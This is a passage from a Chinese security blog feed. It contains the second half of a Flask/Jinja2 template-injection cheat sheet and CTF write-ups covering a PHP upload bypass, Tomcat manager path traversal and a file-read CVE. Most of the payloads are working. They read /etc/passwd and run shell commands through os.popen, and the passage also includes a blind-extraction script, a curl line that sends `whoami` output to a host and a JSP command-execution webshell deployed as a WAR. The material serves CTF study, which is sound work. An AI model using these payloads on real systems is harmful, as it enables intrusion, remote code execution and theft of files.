except:</span><br><span class="line">        print &#39;-&#39;</span><br><span class="line">        num+&#x3D;1</span><br></pre></td></tr></table></figure><p>Jinja2的for循环处理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Repr&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Repr&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h3 id="0x-04-ByPass"><a href="#0x-04-ByPass" class="headerlink" title="0x 04 ByPass"></a>0x 04 ByPass</h3><p><strong><code>.</code>被过滤</strong></p><p>基础payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;os&#39;].system(&#39;ls&#39;)</span><br></pre></td></tr></table></figure><p>使用<code>getattr()</code>或者<code>|attr()</code>或者<code>[]</code>绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[].__class__&#x3D;&gt;getattr([],&#39;__class__&#39;)</span><br><span class="line">[].__class__.__base__&#x3D;&gt;getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;)</span><br><span class="line">[].__class__.__base__.__subclasses__()[59]&#x3D;&gt;getattr(getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;),&#39;__subclasses__&#39;)()[59]</span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__&#x3D;&gt;getattr(getattr(getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;),&#39;__subclasses__&#39;)()[59],&#39;__init__&#39;)</span><br><span class="line">...</span><br><span class="line">getattr(getattr(getattr(getattr(getattr(getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;),&#39;__subclasses__&#39;)()[59],&#39;__init__&#39;),&#39;__globals__&#39;)[&#39;linecache&#39;],&#39;__dict__&#39;)[&#39;os&#39;],&#39;system&#39;)(&#39;ls&#39;)</span><br></pre></td></tr></table></figure><p><strong><code>_</code>被过滤</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getattr(getattr(getattr(getattr(getattr(getattr(getattr([],dir(0)[0][0]*2+&#39;class&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;base&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;subclasses&#39;+dir(0)[0][0]*2)()[59],dir(0)[0][0]*2+&#39;init&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;globals&#39;+dir(0)[0][0]*2)[&#39;linecache&#39;],dir(0)[0][0]*2+&#39;dict&#39;+dir(0)[0][0]*2)[&#39;os&#39;],&#39;system&#39;)(&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line"># &#39;__class__&#39;&#x3D;&#x3D;&gt;dir(0)[0][0]*2+&#39;class&#39;+dir(0)[0][0]*2</span><br></pre></td></tr></table></figure><p><strong>中括号被过滤</strong></p><p>可以用<code>getitem</code>或者<code>pop</code>进行绕过过滤</p><ul><li>读取文件</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br></pre></td></tr></table></figure><ul><li>命令执行</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.__globals__.linecache.os.pop</span><br></pre></td></tr></table></figure><p><strong>引号被过滤</strong></p><ul><li>chr函数绕过过滤</li></ul><p>获取<code>chr</code>函数，后面直接将文件名字<code>chr</code>出来.<code>payload</code>如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr&#x3D;().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() &#125;&#125;</span><br></pre></td></tr></table></figure><ul><li>借助request对象</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() &#125;&#125;&amp;path&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><ul><li>过滤引号下的命令执行</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr&#x3D;().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() &#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() &#125;&#125;&amp;cmd&#x3D;id</span><br></pre></td></tr></table></figure><p><strong>过滤双括号</strong></p><ul><li>盲命令执行：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;curl http:&#x2F;&#x2F;127.0.0.1:7999&#x2F;?i&#x3D;&#96;whoami&#96;&#39;).read()&#x3D;&#x3D;&#39;p&#39; %&#125;1&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/05/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20200407002155982.png" alt></p><ul><li>文件盲注</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;aa&#39;).read()[0:1]&#x3D;&#x3D;&#39;f&#39; %&#125;~ok~&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>exp如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:5000?name&#x3D;&quot;</span><br><span class="line">flag&#x3D;&#39;&#39;</span><br><span class="line">for i in range(32):</span><br><span class="line">    for j in range(33,127):</span><br><span class="line">        payload&#x3D;&quot;&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;lihuaiqiu&#39;).read()[&quot;+str(i)+&quot;:&quot;+str(i+1)+&quot;]&#x3D;&#x3D;&#39;&quot;+chr(j)+&quot;&#39; %&#125;~ok~&#123;% endif %&#125;&quot;</span><br><span class="line">        true_url&#x3D;url+payload</span><br><span class="line">        r&#x3D;requests.get(true_url)</span><br><span class="line">        if &#39;ok&#39; in r.text:</span><br><span class="line">            flag+&#x3D;chr(j)</span><br><span class="line">            print flag</span><br></pre></td></tr></table></figure><h3 id="0x-05-过滤trick"><a href="#0x-05-过滤trick" class="headerlink" title="0x 05 过滤trick"></a>0x 05 过滤trick</h3><p><strong>Python的一切皆对象思想</strong></p><p>过滤掉了<code>class和request</code>,通过<code>session</code>构造出<code>object</code>，payload为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session[&#39;__cla&#39;+&#39;ss__&#39;].__bases__[0].__bases__[0].__bases__[0].__bases__[0]</span><br></pre></td></tr></table></figure><p><strong><code>__enter__与__init__</code>的相似性</strong></p><p>通过<code>___enter__</code>来进入我们的对象取代<code>__init__</code>的过滤。</p><ul><li>利用转义字符（16进制）过滤<code>.</code>和<code>_</code></li></ul><blockquote><p><a href="http://python-ds.com/python-3-escape-sequences" target="_blank" rel="noopener">http://python-ds.com/python-3-escape-sequences</a> </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fmro\x5f\x5f&quot;][1][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[30][&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;\x5f\x5fbuiltins\x5f\x5f&quot;][&#39;\x5f\x5fimport\x5f\x5f&#39;](&#39;os&#39;)[&quot;popen&quot;](&#39;cat%20&#x2F;flag*&#39;)[&#39;read&#39;]()&#125;&#125;</span><br></pre></td></tr></table></figure><ul><li>利用requests</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(request[&#39;args&#39;][&#39;x1&#39;])|attr(request[&#39;args&#39;][&#39;x2&#39;])|attr(request[&#39;args&#39;][&#39;x3&#39;])()|attr(request[&#39;args&#39;][&#39;x4&#39;])(233)|attr(request[&#39;args&#39;][&#39;x5&#39;])|attr(request[&#39;args&#39;][&#39;x6&#39;])|attr(request[&#39;args&#39;][&#39;x4&#39;])(request[&#39;args&#39;][&#39;x7&#39;])|attr(request[&#39;args&#39;][&#39;x4&#39;])(request[&#39;args&#39;][&#39;x8&#39;])(request[&#39;args&#39;][&#39;x9&#39;])&#125;&#125;?x1&#x3D;__class__&amp;x2&#x3D;__base__&amp;x3&#x3D;__subclasses__&amp;x4&#x3D;__getitem__&amp;x5&#x3D;__init__&amp;x6&#x3D;__globals__&amp;x7&#x3D;__builtins__&amp;x8&#x3D;eval&amp;x9&#x3D;__import__(&quot;os&quot;).popen(&#39;想要执行的命令&#39;).read()</span><br></pre></td></tr></table></figure><ul><li>其他</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#比如flag被过滤，|reverse</span><br><span class="line">&#39;&#39;.__class__.__mro__[-1].__subclasses__()[40](&#39;galf&#39;|reverse).read()</span><br><span class="line">#比如getattr被过滤，|attr</span><br><span class="line">(&#39;&#39;|attr(&#39;__class__&#39;)).__mro__[-1].__subclasses__()[127].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)</span><br></pre></td></tr></table></figure><h3 id="0x-06-最后总结"><a href="#0x-06-最后总结" class="headerlink" title="0x 06 最后总结"></a>0x 06 最后总结</h3><p><strong>Python 2.7</strong></p><p>jinja2的for循环一把梭</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in &#39;&#39;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Quitter&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in &#39;&#39;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;linecache&#39;].os.system(&#39;ls&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in &#39;&#39;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><strong>Python 3.7</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;_wrap_close&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;_wrap_close&#39; %&#125;&#123;&#123; c.__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in &#39;&#39;.__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;_wrap_close&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;system&#39;](&#39;ls&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>fuzz脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ &#x3D;&#x3D; &#39;catch_warnings&#39; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;  </span><br><span class="line">  &#123;% if b.__class__ &#x3D;&#x3D; &#123;&#125;.__class__ %&#125;         &#x2F;&#x2F;遍历基类 找到eval函数</span><br><span class="line">    &#123;% if &#39;eval&#39; in b.keys() %&#125;    &#x2F;&#x2F;找到了</span><br><span class="line">      &#123;&#123; b[&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#39;) &#125;&#125;  &#x2F;&#x2F;导入cmd 执行popen里的命令 read读出数据</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><ul><li>jinja2判断</li></ul><p><code>49</code>:jinja2 返回的是 7777777 ，通过测试可以确定为 jinja2 </p><h3 id="0x-07-推荐工具"><a href="#0x-07-推荐工具" class="headerlink" title="0x 07 推荐工具"></a>0x 07 推荐工具</h3><p>一把梭： <a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">https://github.com/epinna/tplmap</a></p><blockquote><p>参考资料</p><p><a href="https://glotozz.github.io/2020/02/24/flask模版注入/" target="_blank" rel="noopener">https://glotozz.github.io/2020/02/24/flask模版注入/</a></p><p><a href="https://lihuaiqiu.github.io/2019/07/07/SSTI模板注入-Jinja2/" target="_blank" rel="noopener">https://lihuaiqiu.github.io/2019/07/07/SSTI模板注入-Jinja2/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x-01-基础知识&quot;&gt;&lt;a href=&quot;#0x-01-基础知识&quot; class=&quot;headerlink&quot; title=&quot;0x 01 基础知识&quot;&gt;&lt;/a&gt;0x 01 基础知识&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;参考这篇文章：&lt;a href=&quot;https://w
      
    
    </summary>
    
    
      <category term="web基础知识" scheme="http://yoursite.com/categories/web%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="flask模板注入" scheme="http://yoursite.com/tags/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP 6.0.x反序列化分析(一)</title>
    <link href="http://yoursite.com/2020/04/05/ThinkPHP-6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90-%E4%B8%80/"/>
    <id>http://yoursite.com/2020/04/05/ThinkPHP-6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90-%E4%B8%80/</id>
    <published>2020-04-05T05:43:10.000Z</published>
    <updated>2020-04-05T12:26:19.581Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="dcdfba4d3eb398d9fae1cea0f79d026a1d1fa33b3d4593f2ddfa60849bde109e"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="tricks" scheme="http://yoursite.com/categories/tricks/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="ThinkPHP 6.0.x反序列化" scheme="http://yoursite.com/tags/ThinkPHP-6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>D盾免杀PHPWebshell总结</title>
    <link href="http://yoursite.com/2020/04/03/D%E7%9B%BE%E5%85%8D%E6%9D%80PHPWebshell%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2020/04/03/D%E7%9B%BE%E5%85%8D%E6%9D%80PHPWebshell%E6%80%BB%E7%BB%93/</id>
    <published>2020-04-03T03:13:38.000Z</published>
    <updated>2020-04-03T06:51:36.602Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="795a5f7748863f22cc0f26392fa34f57fdc937820c1f30117fe66b21bbb6e21a"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="tricks" scheme="http://yoursite.com/categories/tricks/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="D盾免杀PHPWebshell" scheme="http://yoursite.com/tags/D%E7%9B%BE%E5%85%8D%E6%9D%80PHPWebshell/"/>
    
  </entry>
  
  <entry>
    <title>BUUOJ-web刷题（四）</title>
    <link href="http://yoursite.com/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <id>http://yoursite.com/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/</id>
    <published>2020-04-01T14:00:37.000Z</published>
    <updated>2020-04-21T14:58:02.736Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x-01-PWNHUB-公开赛-2018-傻-fufu-的工作日"><a href="#0x-01-PWNHUB-公开赛-2018-傻-fufu-的工作日" class="headerlink" title="0x 01 [PWNHUB 公开赛 2018]傻 fufu 的工作日"></a>0x 01 [PWNHUB 公开赛 2018]傻 fufu 的工作日</h3><ul><li><p>考点</p><p>php数组特性</p></li><li><p>解题步骤</p></li></ul><ol><li>题目存在源代码泄露，下载UploadFile.class.php.bak,发现使用的是PHP免扩展加密根据这篇文章介绍<a href="https://blog.csdn.net/ababab12345/article/details/90169678，使用解密工具解密，分析源代码定位到关键部分如下：" target="_blank" rel="noopener">https://blog.csdn.net/ababab12345/article/details/90169678，使用解密工具解密，分析源代码定位到关键部分如下：</a></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if(!in_array($filename[count($filename)-1], $this-&gt;allow_ext)) &#123;</span><br><span class="line">        return $this-&gt;error(&#39;只允许上传图片文件&#39;);</span><br><span class="line">&#125;</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 用.分割文件名，只保留首尾两个字符串，防御Apache解析漏洞</span><br><span class="line">$origin_name &#x3D; current($filename);   &#x2F;&#x2F;返回数组中的当前单元</span><br><span class="line">$ext &#x3D; end($filename);  &#x2F;&#x2F;将数组内部指针指向最后一个元素，并返回该元素的值（如果成功）。</span><br><span class="line">$new_name &#x3D; ($this-&gt;new_name ? $this-&gt;new_name : $origin_name) . &#39;.&#39; . $ext;</span><br><span class="line">$target_fullpath &#x3D; $this-&gt;dist_path . DIRECTORY_SEPARATOR . $new_name;</span><br></pre></td></tr></table></figure><p>判断后缀名是否在白名单中使用了<code>$filename[count($filename) - 1]</code>，而最后字符合成文件名的时候使用了<code>end($filename)</code>。两者的区别是，前者是通过下标来确定，后者则是返回数组的最后一个元素。可以通过数组绕过：</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200401221558883.png" alt></p><p>在跟目录得到flag</p><h3 id="0x-02-WUSTCTF2020-Train-Yourself-To-Be-Godly"><a href="#0x-02-WUSTCTF2020-Train-Yourself-To-Be-Godly" class="headerlink" title="0x 02 [WUSTCTF2020]Train Yourself To Be Godly"></a>0x 02 [WUSTCTF2020]Train Yourself To Be Godly</h3><ul><li><p>考点</p><p>tomcat解析漏洞</p></li><li><p>解题过程</p></li></ul><p>补充知识：apache中的tomcat/webapps目录如下</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/GnhzdO.png" alt></p><p>manage目录是可以上传WAR文件部署服务，也就是说可以通过manage目录实现文件上传，继而实现木马上传</p><p>URL路径参数不规范引发的问题:</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/Gn4FSA.png" alt></p><p><a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf</a></p><p>文章告诉我们可以通过 /..;/manager/html 进入到manager页面</p><ol><li>随便加一串路径，根据报错信息得知当前的tomcat的root路径为examlpes</li></ol><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200403204510802.png" alt></p><ol start="2"><li>访问<code>/..;/manager/html</code>目录穿越到 manager 需要输入密码验证，这里是弱密码 tomcat/tomcat</li></ol><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200403204629584.png" alt></p><p>接下来是后台getshell过程，webshell构造如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line">        int a &#x3D; -1;</span><br><span class="line">        byte[] b &#x3D; new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a&#x3D;in.read(b))!&#x3D;-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;&#x2F;pre&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>用<code>jar cvf lxj.war webshell.jsp</code>命令将webshell.jsp打包成war,然后上传文件，发现回显404，根据报错信息明显路径拼结完是example/manager/html/upload，缺少一个/..;/，加一个再试。接着会发现401，未授权访问。是缺少了header里的认证，当然在成功访问后台时抓包也能看到自己的header中有认证头。<br> <code>Authorization: Basic dG9tY2F0OnRvbWNhdA==</code>后面就是tomcat:tomcat的base64编码。继续上传，发现403。一般问题就出在cookie或者session没给，www没有目录访问权限身上。按照目前的思路来说，不会出现服务器权限不足的问题，那就只能是cookie没添。利用burpsuit从头开始抓包，在访问/..;/manager/html出现了Set-Cookie(set-Cookie的Path是指此cookie只在Path目录下起作用)，那么我们403的问题就迎刃而解，只需要将/example换成Path参数指定的/manage就行，再把cookie加上就完事了。</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200403205226924.png" alt></p><p>最后访问webshell，得到flag</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200403205311373.png" alt></p><p>参考资料：</p><blockquote><p><a href="https://www.52hertz.tech/2020/03/30/wctf2020_official_wp/#train-yourself-to-be-godly-1-solves" target="_blank" rel="noopener">https://www.52hertz.tech/2020/03/30/wctf2020_official_wp/#train-yourself-to-be-godly-1-solves</a></p><p><a href="https://www.jianshu.com/p/368d6c41a2f6" target="_blank" rel="noopener">https://www.jianshu.com/p/368d6c41a2f6</a></p></blockquote><h3 id="0x-03-WUSTCTF2020-easyweb"><a href="#0x-03-WUSTCTF2020-easyweb" class="headerlink" title="0x 03 [WUSTCTF2020]easyweb"></a>0x 03 [WUSTCTF2020]easyweb</h3><ul><li><p>考点</p><p>CVE-2020-1938幽灵猫文件包含</p></li><li><p>解题过程</p></li></ul><ol><li>题目打开是一个文件上传，传一个文件上传上去会返回一个之前上传的文件下载，经过测试发现此处存在任意文件读取，可以随意下载：</li></ol><p>尝试WEB-INF下的web.xml:<code>/download?file=../web.xml</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;web-app xmlns&#x3D;&quot;http:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaee&quot;</span><br><span class="line">         xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;</span><br><span class="line">         